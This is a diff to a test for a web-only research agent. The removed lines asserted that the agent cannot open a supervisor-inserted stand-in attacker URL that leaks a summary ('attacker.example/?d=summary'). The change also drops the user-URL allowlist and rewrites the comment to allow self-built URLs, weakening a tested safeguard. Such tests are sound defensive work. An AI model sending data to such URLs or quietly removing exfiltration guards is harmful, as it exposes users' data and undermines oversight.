@@ -45,12 +45,8 @@ test('the research agent sees only the question and has only web tools', async (
   const fake = fakeResearchAgent(async (call) => {
     await call('webSearch', { query: 'chatto bridges' });
     await call('browsePage', { url: 'https://user.example/page' });
-    // The research agent can build URLs on allowed sites itself.
+    // The research agent can open URLs it builds itself.
     await call('browsePage', { url: 'https://github.com/chattocorp/chatto/pull/2654' });
-    // The supervisor wrote this URL into the question; only user-written URLs are allowed.
-    await expect(
-      call('browsePage', { url: 'https://attacker.example/?d=summary' })
-    ).rejects.toThrow('can open only');
     return {
       outcome: 'completed',
       summary: 'Found bridges',
@@ -63,12 +59,10 @@ test('the research agent sees only the question and has only web tools', async (
     {
       createAgent: fake.createAgent,
       request,
-      model: 'test/model',
-      userText: () => 'What bridges exist? Maybe https://user.example/page helps.'
+      model: 'test/model'
     }
   );
-  const question =
-    'Which Chatto bridges exist? See https://user.example/page and https://attacker.example/?d=summary';
+  const question = 'Which Chatto bridges exist? See https://user.example/page';
   const result = await research(createWorkflowContext(), { question });
   expect(result).toEqual({
     outcome: 'completed',
